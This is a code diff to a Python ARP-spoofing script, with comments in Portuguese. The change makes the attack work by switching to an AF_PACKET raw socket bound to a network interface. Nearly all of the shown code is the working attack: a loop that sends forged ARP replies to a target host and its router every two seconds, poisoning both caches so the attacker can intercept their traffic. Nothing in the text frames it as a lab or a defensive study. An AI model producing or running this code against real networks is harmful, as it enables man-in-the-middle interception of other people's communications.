@@ -1,5 +1,4 @@
 import socket
-import dpkt
 import struct
 import time
 
@@ -15,11 +14,13 @@ def create_arp_packet(opcode: int, sender_mac: str, sender_ip: str, target_mac: 
     sender_ip_bytes = socket.inet_aton(sender_ip)
     target_ip_bytes = socket.inet_aton(target_ip)
 
+    # Cabeçalho Ethernet
     eth_header = struct.pack(
         "!6s6sH",
         target_mac_bytes, sender_mac_bytes, 0x0806
     )
 
+    # Cabeçalho ARP
     arp_header = struct.pack(
         "!HHBBH6s4s6s4s",
         1, 0x0800, 6, 4, opcode,
@@ -37,11 +38,15 @@ def arp_spoof(interface: str, target_ip: str, router_ip: str, attacker_mac: str)
     Realiza o ataque ARP Spoofing.
     """
     try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        # Criar socket RAW com AF_PACKET para Ethernet
+        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
+        sock.bind((interface, 0))  # Associar à interface de rede
+
         print(f"Iniciando ARP Spoofing na interface {interface}...")
         print(f"Alvo: {target_ip} | Roteador: {router_ip}")
 
         while True:
+            # Criar pacotes ARP
             target_packet = create_arp_packet(
                 opcode=2, sender_mac=attacker_mac,
                 sender_ip=router_ip,
@@ -56,8 +61,9 @@ def arp_spoof(interface: str, target_ip: str, router_ip: str, attacker_mac: str)
                 target_ip=router_ip
             )
 
-            sock.sendto(target_packet, (target_ip, 0))
-            sock.sendto(router_packet, (router_ip, 0))
+            # Enviar pacotes ARP
+            sock.send(target_packet)
+            sock.send(router_packet)
 
             print(f"Pacotes enviados: Alvo -> {target_ip}, Roteador -> {router_ip}")
             time.sleep(2)
